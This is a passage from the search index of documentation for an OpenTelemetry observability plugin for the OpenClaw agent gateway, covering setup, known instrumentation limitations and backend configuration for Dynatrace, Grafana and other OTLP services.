Workflow","text":""},{"location":"development/#1-make-changes","title":"1. Make Changes","text":"<p>Edit the TypeScript files in <code>src/</code> or <code>index.ts</code>.</p>"},{"location":"development/#2-restart-gateway","title":"2. Restart Gateway","text":"<p>OpenClaw uses jiti to load TypeScript at runtime, so no build step is needed:</p> <pre><code>openclaw gateway restart\n</code></pre>"},{"location":"development/#3-verify","title":"3. Verify","text":"<pre><code># Check plugin loaded\nopenclaw otel\n\n# Check gateway logs for [otel] messages\ntail -f ~/.openclaw/gateway.log | grep otel\n</code></pre>"},{"location":"development/#4-test-with-debug-exporter","title":"4. Test with Debug Exporter","text":"<p>For quick development, use the collector's debug exporter to see spans in stdout:</p> <pre><code>docker compose up -d\ndocker compose logs -f otel-collector\n</code></pre> <p>Every exported span/metric will appear in the collector logs.</p>"},{"location":"development/#type-checking","title":"Type Checking","text":"<pre><code>npm run typecheck\n</code></pre> <p>Note</p> <p>The plugin uses OpenClaw's plugin API via <code>any</code> types since the SDK types aren't published separately yet. Once <code>openclaw/plugin-sdk</code> is published, we'll add proper type imports.</p>"},{"location":"development/#testing-locally-without-a-backend","title":"Testing Locally Without a Backend","text":"<p>You can run with just the debug exporter (no Dynatrace/Grafana needed):</p> <ol> <li> <p>Edit <code>collector/otel-collector-config.yaml</code>:</p> <pre><code>service:\n  pipelines:\n    traces:\n      receivers: [otlp]\n      processors: [batch]\n      exporters: [debug]  # Remove dynatrace exporter\n</code></pre> </li> <li> <p>Start the collector: <code>docker compose up -d</code></p> </li> <li>Watch spans: <code>docker compose logs -f otel-collector</code></li> <li>Send messages to your OpenClaw agent \u2014 you'll see spans appear in the logs</li> </ol>"},{"location":"development/#adding-new-metrics","title":"Adding New Metrics","text":"<ol> <li> <p>Define the instrument in <code>src/telemetry.ts</code>:</p> <pre><code>// In OtelCounters interface\nmyNewMetric: Counter;\n\n// In initTelemetry()\nmyNewMetric: meter.createCounter(\"openclaw.my.new_metric\", {\n  description: \"Description of what this measures\",\n  unit: \"unit\",\n}),\n</code></pre> </li> <li> <p>Record values in <code>src/hooks.ts</code> or <code>index.ts</code>:</p> <pre><code>telemetry.counters.myNewMetric.add(1, { \"attribute.key\": \"value\" });\n</code></pre> </li> <li> <p>Document in <code>docs/telemetry/metrics.md</code></p> </li> </ol>"},{"location":"development/#adding-new-spans","title":"Adding New Spans","text":"<ol> <li> <p>Use the tracer in <code>src/hooks.ts</code>:</p> <pre><code>const span = tracer.startSpan(\"openclaw.my.operation\", {\n  kind: SpanKind.INTERNAL,\n  attributes: {\n    \"openclaw.my.attribute\": \"value\",\n  },\n});\n\n// ... do work ...\n\nspan.setStatus({ code: SpanStatusCode.OK });\nspan.end();\n</code></pre> </li> <li> <p>Document in <code>docs/telemetry/traces.md</code></p> </li> </ol>"},{"location":"development/#building-the-documentation","title":"Building the Documentation","text":"<pre><code># Install MkDocs (one-time)\npip install mkdocs-material\n\n# Serve locally\nmkdocs serve\n\n# Build static site\nmkdocs build\n\n# Deploy to GitHub Pages\nmkdocs gh-deploy\n</code></pre>"},{"location":"development/#publishing-to-npm","title":"Publishing to npm","text":"<p>When ready to publish as an installable OpenClaw plugin:</p> <pre><code># Update version in package.json and openclaw.plugin.json\nnpm version patch\n\n# Publish\nnpm publish --access public\n</code></pre> <p>Users can then install with:</p> <pre><code>openclaw plugins install @openclaw/otel-observability\n</code></pre>"},{"location":"development/#contributing","title":"Contributing","text":"<ol> <li>Fork the repository</li> <li>Create a feature branch: <code>git checkout -b feature/my-feature</code></li> <li>Make your changes</li> <li>Run type-check: <code>npm run typecheck</code></li> <li>Test with a local collector</li> <li>Submit a pull request</li> </ol>"},{"location":"development/#commit-convention","title":"Commit Convention","text":"<p>Use conventional commits:</p> <ul> <li><code>feat: add new metric for session duration</code></li> <li><code>fix: handle missing tool name in hook</code></li> <li><code>docs: update Dynatrace setup guide</code></li> <li><code>refactor: simplify config parsing</code></li> </ul>"},{"location":"getting-started/","title":"Getting Started","text":"<p>Get OpenTelemetry observability for your OpenClaw AI agents.</p>"},{"location":"getting-started/#prerequisites","title":"Prerequisites","text":"<ul> <li>OpenClaw v2026.2.0 or later</li> <li>An OTLP endpoint (local collector, Dynatrace, Grafana, etc.)</li> </ul>"},{"location":"getting-started/#option-1-official-diagnostics-plugin-recommended-start","title":"Option 1: Official Diagnostics Plugin (Recommended Start)","text":"<p>The fastest way to get observability. No installation needed \u2014 just configure.</p>"},{"location":"getting-started/#step-1-add-configuration","title":"Step 1: Add Configuration","text":"<p>Add to your <code>~/.openclaw/openclaw.json</code>:</p> <pre><code>{\n  \"diagnostics\": {\n    \"enabled\": true,\n    \"otel\": {\n      \"enabled\": true,\n      \"endpoint\": \"http://localhost:4318\",\n      \"serviceName\": \"openclaw-gateway\",\n      \"traces\": true,\n      \"metrics\": true,\n      \"logs\": true\n    }\n  }\n}\n</code></pre>"},{"location":"getting-started/#step-2-restart-gateway","title":"Step 2: Restart Gateway","text":"<pre><code>openclaw gateway restart\n</code></pre>"},{"location":"getting-started/#step-3-verify","title":"Step 3: Verify","text":"<p>Send a message to your agent and check your backend for:</p> <ul> <li>Metrics: <code>openclaw.tokens</code>, <code>openclaw.cost.usd</code>, <code>openclaw.run.duration_ms</code></li> <li>Traces: <code>openclaw.model.usage</code>, <code>openclaw.message.processed</code></li> <li>Logs: Gateway logs with severity and code location</li> </ul>"},{"location":"getting-started/#option-2-custom-hook-based-plugin-deeper-tracing","title":"Option 2: Custom Hook-Based Plugin (Deeper Tracing)","text":"<p>For connected traces and per-tool-call visibility, add the custom plugin.</p>"},{"location":"getting-started/#step-1-clone-the-repository","title":"Step 1: Clone the Repository","text":"<pre><code>cd ~/.openclaw/extensions\ngit clone https://github.com/henrikrexed/openclaw-observability-plugin.git otel-observability\n</code></pre>"},{"location":"getting-started/#step-2-install-dependencies","title":"Step 2: Install Dependencies","text":"<pre><code>cd otel-observability\nnpm install\n</code></pre>"},{"location":"getting-started/#step-3-configure-openclaw","title":"Step 3: Configure OpenClaw","text":"<p>Add to your <code>~/.openclaw/openclaw.json</code>:</p> <pre><code>{\n  \"plugins\": {\n    \"load\": {\n      \"paths\": [\"~/.openclaw/extensions/otel-observability\"]\n    },\n    \"entries\": {\n      \"otel-observability\": {\n        \"enabled\": true,\n        \"config\": {\n          \"endpoint\": \"http://localhost:4318\",\n          \"serviceName\": \"openclaw-gateway\",\n          \"enableTraces\": true,\n          \"enableMetrics\": true\n        }\n      }\n    }\n  }\n}\n</code></pre>"},{"location":"getting-started/#step-4-clear-cache-and-restart","title":"Step 4: Clear Cache and Restart","text":"<pre><code>rm -rf /tmp/jiti\nsystemctl --user restart openclaw-gateway\n# Or: openclaw gateway restart\n</code></pre>"},{"location":"getting-started/#step-5-verify-connected-traces","title":"Step 5: Verify Connected Traces","text":"<p>Send a message that triggers tool calls (e.g., \"read my AGENTS.md file\"). You should see:</p> <pre><code>openclaw.request\n\u2514\u2500\u2500 openclaw.agent.turn\n    \u2514\u2500\u2500 tool.Read\n</code></pre>"},{"location":"getting-started/#using-both-plugins-together","title":"Using Both Plugins Together","text":"<p>For complete observability, enable both:</p> <pre><code>{\n  \"diagnostics\": {\n    \"enabled\": true,\n    \"otel\": {\n      \"enabled\": true,\n      \"endpoint\": \"http://localhost:4318\",\n      \"serviceName\": \"openclaw-gateway\",\n      \"traces\": true,\n      \"metrics\": true,\n      \"logs\": true\n    }\n  },\n  \"plugins\": {\n    \"load\": {\n      \"paths\": [\"~/.openclaw/extensions/otel-observability\"]\n    },\n    \"entries\": {\n      \"otel-observability\": {\n        \"enabled\": true,\n        \"config\": {\n          \"endpoint\": \"http://localhost:4318\",\n          \"serviceName\": \"openclaw-gateway\"\n        }\n      }\n    }\n  }\n}\n</code></pre> <p>What you get:</p> Source Data Official Gateway health, queue metrics, log forwarding, session states Custom Connected request traces, tool call spans, agent turn details"},{"location":"getting-started/#backend-quick-setup","title":"Backend Quick Setup","text":""},{"location":"getting-started/#local-otel-collector","title":"Local OTel Collector","text":"<ol> <li> <p>Install:    <pre><code># Ubuntu/Debian\nwget https://github.com/open-telemetry/opentelemetry-collector-releases/releases/download/v0.144.0/otelcol-contrib_0.144.0_linux_amd64.deb\nsudo dpkg -i otelcol-contrib_0.144.0_linux_amd64.deb\n</code></pre></p> </li> <li> <p>Configure (<code>/etc/otelcol-contrib/config.yaml</code>):    <pre><code>receivers:\n  otlp:\n    protocols:\n      http:\n        endpoint: 0.0.0.0:4318\n\nprocessors:\n  batch:\n\nexporters:\n  debug:\n    verbosity: detailed\n  # Add your backend exporter\n\nservice:\n  pipelines:\n    traces:\n      receivers: [otlp]\n      processors: [batch]\n      exporters: [debug]\n    metrics:\n      receivers: [otlp]\n      processors: [batch]\n      exporters: [debug]\n    logs:\n      receivers: [otlp]\n      processors: [batch]\n      exporters: [debug]\n</code></pre></p> </li> <li> <p>Start:    <pre><code>sudo systemctl start otelcol-contrib\n</code></pre></p> </li> </ol>"},{"location":"getting-started/#dynatrace-direct","title":"Dynatrace (Direct)","text":"<p>No collector needed:</p> <pre><code>{\n  \"diagnostics\": {\n    \"enabled\": true,\n    \"otel\": {\n      \"enabled\": true,\n      \"endpoint\": \"https://{environment-id}.live.dynatrace.com/api/v2/otlp\",\n      \"headers\": {\n        \"Authorization\": \"Api-Token {your-token}\"\n      },\n      \"serviceName\": \"openclaw-gateway\",\n      \"traces\": true,\n      \"metrics\": true,\n      \"logs\": true\n    }\n  }\n}\n</code></pre> <p>Required scopes: <code>metrics.ingest</code>, <code>logs.ingest</code>, <code>openTelemetryTrace.ingest</code></p>"},{"location":"getting-started/#grafana-cloud","title":"Grafana Cloud","text":"<pre><code>{\n  \"diagnostics\": {\n    \"enabled\": true,\n    \"otel\": {\n      \"enabled\": true,\n      \"endpoint\": \"https://otlp-gateway-{region}.grafana.net/otlp\",\n      \"headers\": {\n        \"Authorization\": \"Basic {base64(instanceId:apiKey)}\"\n      },\n      \"serviceName\": \"openclaw-gateway\",\n      \"traces\": true,\n      \"metrics\": true\n    }\n  }\n}\n</code></pre>"},{"location":"getting-started/#troubleshooting","title":"Troubleshooting","text":""},{"location":"getting-started/#no-data-appearing","title":"No data appearing?","text":"<ol> <li> <p>Check Gateway logs:    <pre><code>journalctl --user -u openclaw-gateway -f\n</code></pre></p> </li> <li> <p>Verify endpoint is reachable:    <pre><code>curl -v http://localhost:4318/v1/traces\n</code></pre></p> </li> <li> <p>Check diagnostics config:    <pre><code>cat ~/.openclaw/openclaw.json | jq '.diagnostics'\n</code></pre></p> </li> </ol>"},{"location":"getting-started/#custom-plugin-not-loading","title":"Custom plugin not loading?","text":"<ol> <li> <p>Check plugin discovery:    <pre><code>openclaw plugins list\n</code></pre></p> </li> <li> <p>Clear jiti cache:    <pre><code>rm -rf /tmp/jiti\n</code></pre></p> </li> <li> <p>Check for TypeScript errors in Gateway logs</p> </li> </ol>"},{"location":"getting-started/#traces-not-connected","title":"Traces not connected?","text":"<p>The custom plugin requires messages to flow through the normal pipeline. Heartbeats and some internal events may not have full trace context.</p>"},{"location":"getting-started/#next-steps","title":"Next Steps","text":"<ul> <li>Configuration Reference \u2014 All options</li> <li>Architecture \u2014 How it works</li> <li>Limitations \u2014 Known constraints</li> <li>Backend Guides \u2014 Specific backend setup</li> </ul>"},{"location":"limitations/","title":"Limitations","text":""},{"location":"limitations/#official-diagnostics-otel-plugin-dependency-issue","title":"Official diagnostics-otel Plugin Dependency Issue","text":"<p>When OpenClaw is installed via npm (not pnpm from source), the bundled <code>@openclaw/diagnostics-otel</code> plugin may fail to load with:</p> <pre><code>Error: Cannot find module '@opentelemetry/api'\n</code></pre> <p>Why: The official plugin uses <code>workspace:*</code> dependency protocol (pnpm monorepo feature) that doesn't resolve when installed via npm.</p> <p>Workaround: Use this custom plugin instead, which has its own properly installed OTel dependencies.</p> <p>Note: Don't run both plugins simultaneously \u2014 they both initialize the OTel SDK which can cause conflicts.</p>"},{"location":"limitations/#auto-instrumentation-limitations","title":"Auto-Instrumentation Limitations","text":""},{"location":"limitations/#no-per-llm-call-auto-instrumentation","title":"No Per-LLM-Call Auto-Instrumentation","text":"<p>The plugin cannot produce individual spans for each LLM API call (e.g., <code>anthropic.chat</code> or <code>openai.chat.completions.create</code>). Instead, token usage and model info are captured per agent turn \u2014 aggregated across all LLM calls within a single turn.</p>"},{"location":"limitations/#what-you-get-vs-whats-missing","title":"What You Get vs. What's Missing","text":"Capability Status Details Token usage per agent turn \u2705 <code>gen_ai.usage.input_tokens</code>, <code>.output_tokens</code>, <code>.total_tokens</code> Model name \u2705 <code>gen_ai.response.model</code> on agent turn span Cache token tracking \u2705 <code>cacheRead</code> and <code>cacheWrite</code> included in totals Agent turn duration \u2705 Full turn timing as span duration + histogram Tool execution spans \u2705 Individual <code>tool.*</code> spans per tool call Connected traces \u2705 <code>openclaw.request</code> \u2192 <code>openclaw.agent.turn</code> \u2192 <code>tool.*</code> Per-LLM-call spans \u274c No individual <code>anthropic.chat</code> spans Per-LLM-call latency \u274c Only full turn duration, not individual call timing Multiple LLM calls per turn \u26a0\ufe0f Token counts summed; can't distinguish individual calls Request/response content \u274c No prompt/completion text capture on LLM calls Standard GenAI dashboards \u26a0\ufe0f Custom dashboards needed (not standard <code>gen_ai.*</code> span shape)"},{"location":"limitations/#why","title":"Why?","text":"<p>We attempted three approaches to enable auto-instrumentation. All failed due to OpenClaw's ESM module architecture.</p>"},{"location":"limitations/#approach-1-plugin-side-sdk-patching","title":"Approach 1: Plugin-Side SDK Patching","text":"<p>OpenClaw's plugin loader uses jiti (a CJS-compatible TypeScript loader). The <code>@anthropic-ai/sdk</code> package has dual entry points:</p> <ul> <li>ESM: <code>@anthropic-ai/sdk/index.mjs</code> \u2014 loaded by <code>@mariozechner/pi-ai</code> (OpenClaw's LLM provider) via <code>import</code></li> <li>CJS: <code>@anthropic-ai/sdk/index.js</code> \u2014 loaded by the plugin via <code>createRequire()</code></li> </ul> <p>These are completely separate module instances with different prototypes. Patching the CJS version has zero effect on the ESM instance that actually handles LLM calls.</p> <p>Additionally, jiti blocks native <code>import()</code> calls (<code>ERR_VM_DYNAMIC_IMPORT_CALLBACK_MISSING</code>), making it impossible to access the ESM instance from plugin code.</p>"},{"location":"limitations/#approach-2-node_options-preload-with-iitm","title":"Approach 2: NODE_OPTIONS Preload with IITM","text":"<p>The standard OpenTelemetry approach for ESM instrumentation:</p> <pre><code>NODE_OPTIONS=\"--import ./instrumentation/preload.mjs\"\n</code></pre> <p>This uses import-in-the-middle (IITM) to register ESM loader hooks that intercept module imports. However, IITM intercepts all ESM modules globally \u2014 not just the targeted ones.</p> <p>When IITM wraps <code>@mariozechner/pi-ai</code>, it breaks the module's named exports:</p> <pre><code>SyntaxError: The requested module '@mariozechner/pi-ai' does not\nprovide an export named 'getEnvApiKey'\n</code></pre> <p>This crash-loops the gateway on startup.</p>"},{"location":"limitations/#approach-3-manual-register-with-iitm","title":"Approach 3: Manual register() with IITM","text":"<p>Using <code>register()</code> from <code>node:module</code> to manually install IITM loader hooks produces the same crash \u2014 the hooks are global and cannot selectively skip modules.</p>"},{"location":"limitations/#environment","title":"Environment","text":"<ul> <li>Node.js v22.22.0</li> <li><code>@opentelemetry/instrumentation</code> 0.203.0</li> <li><code>import-in-the-middle</code> 1.15.0</li> <li><code>@anthropic-ai/sdk</code> 0.71.2</li> </ul>"},{"location":"limitations/#path-forward","title":"Path Forward","text":"<p>A feature request has been filed on the OpenClaw project suggesting:</p> <ol> <li>LLM call events on the plugin API \u2014 emit <code>llm_call_start</code>/<code>llm_call_end</code> events so plugins can create per-call spans without monkey-patching</li> <li>Built-in OTel hook in pi-ai \u2014 a callback around the actual SDK call in the provider layer</li> <li>Fix IITM compatibility \u2014 investigate why IITM breaks <code>@mariozechner/pi-ai</code> exports</li> <li>Native OTel support \u2014 bundle instrumentation directly in OpenClaw where it can control the loader lifecycle</li> </ol> <p>Until one of these is implemented, the hook-based approach provides solid observability for token tracking, tool monitoring, and request tracing \u2014 just without per-LLM-call granularity.</p>"},{"location":"backends/","title":"Backends","text":"<p>The plugin exports telemetry via standard OTLP (OpenTelemetry Protocol), which means it works with any OpenTelemetry-compatible backend.</p>"},{"location":"backends/#supported-backends","title":"Supported Backends","text":"Backend Direct Export Via Collector Guide Dynatrace \u2705 \u2705 Setup \u2192 Grafana (Tempo + Mimir) \u2705 \u2705 Setup \u2192 Datadog \u274c \u2705 Generic \u2192 Honeycomb \u2705 \u2705 Generic \u2192 New Relic \u2705 \u2705 Generic \u2192 Splunk \u274c \u2705 Generic \u2192 Jaeger \u2705 \u2705 Generic \u2192 SigNoz \u2705 \u2705 Generic \u2192 OTel Collector \u2014 \u2014 Setup \u2192"},{"location":"backends/#direct-export-vs-collector","title":"Direct Export vs. Collector","text":""},{"location":"backends/#direct-export","title":"Direct Export","text":"<pre><code>flowchart LR\n    A[OpenClaw Plugin] --&gt;|OTLP| B[Backend]</code></pre> <ul> <li>Simpler setup \u2014 no extra components</li> <li>Works well for single-backend setups</li> <li>Backend credentials are in the OpenClaw config</li> </ul>"},{"location":"backends/#via-otel-collector-recommended","title":"Via OTel Collector (Recommended)","text":"<pre><code>flowchart LR\n    A[OpenClaw Plugin] --&gt;|OTLP| B[OTel Collector]\n    B --&gt;|OTLP| C[Dynatrace]\n    B --&gt;|OTLP| D[Grafana]\n    B --&gt;|Prometheus| E[Prometheus]</code></pre> <ul> <li>Batching &amp; retry \u2014 handles network hiccups gracefully</li> <li>Processing \u2014 filter, transform, and enrich data before export</li> <li>Fan-out \u2014 send to multiple backends simultaneously</li> <li>Decoupled auth \u2014 backend credentials stay on the collector, not in OpenClaw</li> <li>Sampling \u2014 reduce data volume for high-traffic agents</li> </ul> <p>Recommendation</p> <p>Use the OTel Collector in production. Use direct export for quick development testing.</p>"},{"location":"backends/dynatrace/","title":"Dynatrace Setup","text":"<p>Send OpenClaw telemetry directly to Dynatrace using OTLP.</p>"},{"location":"backends/dynatrace/#prerequisites","title":"Prerequisites","text":"<ul> <li>Dynatrace environment (SaaS or Managed)</li> <li>API token with ingest permissions</li> </ul>"},{"location":"backends/dynatrace/#create-api-token","title":"Create API Token","text":"<ol> <li>Go to Settings \u2192 Access tokens</li> <li>Click Generate new token</li> <li>Add scopes:</li> <li><code>metrics.ingest</code></li> <li><code>logs.ingest</code></li> <li><code>openTelemetryTrace.ingest</code></li> <li>Copy the token (starts with <code>dt0c01.</code>)</li> </ol>"},{"location":"backends/dynatrace/#configure-openclaw","title":"Configure OpenClaw","text":"<p>Add to <code>~/.openclaw/openclaw.json</code>:</p> <pre><code>{\n  \"diagnostics\": {\n    \"enabled\": true,\n    \"otel\": {\n      \"enabled\": true,\n      \"endpoint\": \"https://{environment-id}.live.dynatrace.com/api/v2/otlp\",\n      \"headers\": {\n        \"Authorization\": \"Api-Token dt0c01.XXXXXXXX\"\n      },\n      \"serviceName\": \"openclaw-gateway\",\n      \"traces\": true,\n      \"metrics\": true,\n      \"logs\": true\n    }\n  }\n}\n</code></pre> <p>Replace: - <code>{environment-id}</code> \u2014 Your Dynatrace environment ID (e.g., <code>abc12345</code>) - <code>dt0c01.XXXXXXXX</code> \u2014 Your API token</p>"},{"location":"backends/dynatrace/#dynatrace-managed","title":"Dynatrace Managed","text":"<p>For Dynatrace Managed, use your ActiveGate URL:</p> <pre><code>{\n  \"diagnostics\": {\n    \"enabled\": true,\n    \"otel\": {\n      \"enabled\": true,\n      \"endpoint\": \"https://{your-activegate}/e/{environment-id}/api/v2/otlp\",\n      \"headers\": {\n        \"Authorization\": \"Api-Token dt0c01.XXXXXXXX\"\n      },\n      \"serviceName\": \"openclaw-gateway\"\n    }\n  }\n}\n</code></pre>"},{"location":"backends/dynatrace/#restart-gateway","title":"Restart Gateway","text":"<pre><code>openclaw gateway restart\n</code></pre>"},{"location":"backends/dynatrace/#verify-in-dynatrace","title":"Verify in Dynatrace","text":""},{"location":"backends/dynatrace/#find-your-service","title":"Find Your Service","text":"<ol> <li>Go to Services in Dynatrace</li> <li>Search for <code>openclaw-gateway</code></li> <li>Click to view service details</li> </ol>"},{"location":"backends/dynatrace/#view-traces","title":"View Traces","text":"<ol> <li>Go to Distributed traces</li> <li>Filter by service: <code>openclaw-gateway</code></li> <li>Click a trace to see spans</li> </ol>"},{"location":"backends/dynatrace/#view-metrics","title":"View Metrics","text":"<ol> <li>Go to Explore \u2192 Metrics</li> <li>Search for <code>openclaw.</code></li> <li>Available metrics:</li> <li><code>openclaw.tokens</code> \u2014 Token usage</li> <li><code>openclaw.cost.usd</code> \u2014 Cost tracking</li> <li><code>openclaw.run.duration_ms</code> \u2014 Agent run times</li> <li><code>openclaw.message.*</code> \u2014 Message processing</li> <li><code>openclaw.queue.*</code> \u2014 Queue metrics</li> </ol>"},{"location":"backends/dynatrace/#create-dashboard","title":"Create Dashboard","text":"<p>Create a dashboard with:</p> <pre><code>-- Token usage by model\ntimeseries sum(openclaw.tokens), by:{openclaw.model, openclaw.token}\n\n-- Cost over time\ntimeseries sum(openclaw.cost.usd), by:{openclaw.model}\n\n-- Agent run duration\ntimeseries avg(openclaw.run.duration_ms), by:{openclaw.model}\n</code></pre>"},{"location":"backends/dynatrace/#view-logs","title":"View Logs","text":"<ol> <li>Go to Logs</li> <li>Filter: <code>dt.entity.service = \"openclaw-gateway\"</code></li> <li>View log records with severity and attributes</li> </ol>"},{"location":"backends/dynatrace/#example-dql-queries","title":"Example DQL Queries","text":""},{"location":"backends/dynatrace/#token-usage-by-model","title":"Token Usage by Model","text":"<pre><code>fetch spans\n| filter dt.entity.service == \"openclaw-gateway\"\n| summarize tokens = sum(openclaw.tokens.total), by:{openclaw.model}\n| sort tokens desc\n</code></pre>"},{"location":"backends/dynatrace/#average-run-duration","title":"Average Run Duration","text":"<pre><code>fetch spans\n| filter dt.entity.service == \"openclaw-gateway\"\n| filter matchesPhrase(span.name, \"model\")\n| summarize avg_duration = avg(openclaw.run.duration_ms)\n</code></pre>"},{"location":"backends/dynatrace/#error-rate","title":"Error Rate","text":"<pre><code>fetch logs\n| filter dt.entity.service == \"openclaw-gateway\"\n| filter loglevel == \"ERROR\"\n| summarize count = count()\n</code></pre>"},{"location":"backends/dynatrace/#troubleshooting","title":"Troubleshooting","text":""},{"location":"backends/dynatrace/#no-data-in-dynatrace","title":"No Data in Dynatrace?","text":"<ol> <li>Check token permissions: Ensure all three scopes are enabled</li> <li>Verify endpoint URL: Should be <code>https://{env-id}.live.dynatrace.com/api/v2/otlp</code></li> <li>Test connectivity:    <pre><code>curl -v \"https://{env-id}.live.dynatrace.com/api/v2/otlp/v1/traces\" \\\n  -H \"Authorization: Api-Token dt0c01.xxx\"\n</code></pre></li> </ol>"},{"location":"backends/dynatrace/#service-not-appearing","title":"Service Not Appearing?","text":"<ul> <li>Wait 2-5 minutes for service detection</li> <li>Send a few messages to generate telemetry</li> <li>Check Dynatrace logs for ingest errors</li> </ul>"},{"location":"backends/dynatrace/#403-forbidden","title":"403 Forbidden?","text":"<p>Token lacks required scopes. Regenerate with all three: - <code>metrics.ingest</code> - <code>logs.ingest</code> - <code>openTelemetryTrace.ingest</code></p>"},{"location":"backends/generic-otlp/","title":"Generic OTLP Backend","text":"<p>Any backend that supports OTLP (OpenTelemetry Protocol) can receive data from this plugin. Here are configuration snippets for popular backends.</p>"},{"location":"backends/generic-otlp/#honeycomb","title":"Honeycomb","text":"<pre><code>{\n  \"config\": {\n    \"endpoint\": \"https://api.honeycomb.io\",\n    \"protocol\": \"http\",\n    \"headers\": {\n      \"x-honeycomb-team\": \"&lt;YOUR_API_KEY&gt;\"\n    }\n  }\n}\n</code></pre>"},{"location":"backends/generic-otlp/#new-relic","title":"New Relic","text":"<pre><code>{\n  \"config\": {\n    \"endpoint\": \"https://otlp.nr-data.net\",\n    \"protocol\": \"http\",\n    \"headers\": {\n      \"api-key\": \"&lt;YOUR_INGEST_LICENSE_KEY&gt;\"\n    }\n  }\n}\n</code></pre> <p>Note</p> <p>For EU data centers, use <code>https://otlp.eu01.nr-data.net</code>.</p>"},{"location":"backends/generic-otlp/#datadog","title":"Datadog","text":"<p>Datadog doesn't support direct OTLP ingest \u2014 use the OTel Collector with the Datadog exporter.</p>"},{"location":"backends/generic-otlp/#collector-config","title":"Collector Config","text":"<pre><code>exporters:\n  datadog:\n    api:\n      key: \"${DD_API_KEY}\"\n      site: \"datadoghq.com\"  # or datadoghq.eu, etc.\n\nservice:\n  pipelines:\n    traces:\n      receivers: [otlp]\n      processors: [batch]\n      exporters: [datadog]\n    metrics:\n      receivers: [otlp]\n      processors: [batch]\n      exporters: [datadog]\n</code></pre>"},{"location":"backends/generic-otlp/#plugin-config","title":"Plugin Config","text":"<p>Point at the local collector:</p> <pre><code>{\n  \"config\": {\n    \"endpoint\": \"http://localhost:4318\"\n  }\n}\n</code></pre>"},{"location":"backends/generic-otlp/#signoz","title":"SigNoz","text":"<pre><code>{\n  \"config\": {\n    \"endpoint\": \"https://ingest.&lt;region&gt;.signoz.cloud:443\",\n    \"protocol\": \"http\",\n    \"headers\": {\n      \"signoz-access-token\": \"&lt;YOUR_SIGNOZ_TOKEN&gt;\"\n    }\n  }\n}\n</code></pre> <p>Or self-hosted:</p> <pre><code>{\n  \"config\": {\n    \"endpoint\": \"http://&lt;signoz-host&gt;:4318\"\n  }\n}\n</code></pre>"},{"location":"backends/generic-otlp/#jaeger","title":"Jaeger","text":"<p>Jaeger supports OTLP natively since v1.35:</p> <pre><code>{\n  \"config\": {\n    \"endpoint\": \"http://&lt;jaeger-host&gt;:4318\",\n    \"protocol\": \"http\"\n  }\n}\n</code></pre> <p>Note</p> <p>Jaeger only supports traces, not metrics or logs via OTLP.</p>"},{"location":"backends/generic-otlp/#splunk","title":"Splunk","text":"<p>Use the OTel Collector with the Splunk HEC exporter:</p>"},{"location":"backends/generic-otlp/#collector-config_1","title":"Collector Config","text":"<pre><code>exporters:\n  splunk_hec:\n    token: \"${SPLUNK_HEC_TOKEN}\"\n    endpoint: \"https://&lt;splunk-host&gt;:8088/services/collector\"\n    source: \"openclaw\"\n    sourcetype: \"otel\"\n\nservice:\n  pipelines:\n    traces:\n      receivers: [otlp]\n      processors: [batch]\n      exporters: [splunk_hec]\n</code></pre>"},{"location":"backends/generic-otlp/#elastic-elasticsearch","title":"Elastic / Elasticsearch","text":"<p>Use the OTel Collector with the Elasticsearch exporter:</p>"},{"location":"backends/generic-otlp/#collector-config_2","title":"Collector Config","text":"<pre><code>exporters:\n  elasticsearch:\n    endpoints: [\"https://&lt;elastic-host&gt;:9200\"]\n    user: \"${ELASTIC_USER}\"\n    password: \"${ELASTIC_PASSWORD}\"\n\nservice:\n  pipelines:\n    traces:\n      receivers: [otlp]\n      processors: [batch]\n      exporters: [elasticsearch]\n    logs:\n      receivers: [otlp]\n      processors: [batch]\n      exporters: [elasticsearch]\n</code></pre>"},{"location":"backends/generic-otlp/#custom-self-hosted-collector","title":"Custom / Self-Hosted Collector","text":"<p>If your backend isn't listed, you can almost certainly connect it via the OTel Collector. The contrib distribution includes exporters for 50+ backends.</p> <ol> <li>Find your exporter in the collector contrib registry</li> <li>Add it to the collector config</li> <li>Point the plugin at <code>http://localhost:4318</code></li> </ol>"},{"location":"backends/grafana/","title":"Grafana Integration","text":"<p>Export OpenClaw traces to Grafana Tempo and metrics to Grafana Mimir (or Prometheus) for visualization in Grafana dashboards.</p>"},{"location":"backends/grafana/#grafana-cloud-direct-export","title":"Grafana Cloud (Direct Export)","text":""},{"location":"backends/grafana/#1-get-your-otlp-credentials","title":"1. Get Your OTLP Credentials","text":"<ol> <li>Go to grafana.com \u2192 Your stack \u2192 Connections \u2192 OpenTelemetry</li> <li>Note the OTLP endpoint and generate an API token</li> </ol>"},{"location":"backends/grafana/#2-configure-the-plugin","title":"2. Configure the Plugin","text":"<pre><code>{\n  \"plugins\": {\n    \"entries\": {\n      \"otel-observability\": {\n        \"enabled\": true,\n        \"config\": {\n          \"endpoint\": \"https://otlp-gateway-&lt;region&gt;.grafana.net/otlp\",\n          \"protocol\": \"http\",\n          \"serviceName\": \"openclaw-gateway\",\n          \"headers\": {\n            \"Authorization\": \"Basic &lt;base64-of-instanceId:apiToken&gt;\"\n          }\n        }\n      }\n    }\n  }\n}\n</code></pre> <p>Creating the Basic auth header</p> <pre><code>echo -n \"&lt;instanceId&gt;:&lt;apiToken&gt;\" | base64\n</code></pre>"},{"location":"backends/grafana/#self-hosted-grafana-stack","title":"Self-Hosted Grafana Stack","text":""},{"location":"backends/grafana/#docker-compose-addition","title":"Docker Compose Addition","text":"<p>Add Tempo and Grafana to the collector setup:</p> <pre><code>services:\n  otel-collector:\n    # ... existing config ...\n\n  tempo:\n    image: grafana/tempo:latest\n    container_name: openclaw-tempo\n    ports:\n      - \"3200:3200\"   # Tempo API\n      - \"4417:4317\"   # OTLP gRPC (Tempo)\n    volumes:\n      - ./collector/tempo-config.yaml:/etc/tempo/config.yaml:ro\n    command: [\"-config.file=/etc/tempo/config.yaml\"]\n\n  grafana:\n    image: grafana/grafana:latest\n    container_name: openclaw-grafana\n    ports:\n      - \"3000:3000\"\n    environment:\n      - GF_AUTH_ANONYMOUS_ENABLED=true\n      - GF_AUTH_ANONYMOUS_ORG_ROLE=Admin\n    volumes:\n      - grafana-data:/var/lib/grafana\n\nvolumes:\n  grafana-data:\n</code></pre>"},{"location":"backends/grafana/#tempo-configuration","title":"Tempo Configuration","text":"<p>Create <code>collector/tempo-config.yaml</code>:</p> <pre><code>server:\n  http_listen_port: 3200\n\ndistributor:\n  receivers:\n    otlp:\n      protocols:\n        grpc:\n          endpoint: 0.0.0.0:4317\n\nstorage:\n  trace:\n    backend: local\n    local:\n      path: /tmp/tempo/blocks\n    wal:\n     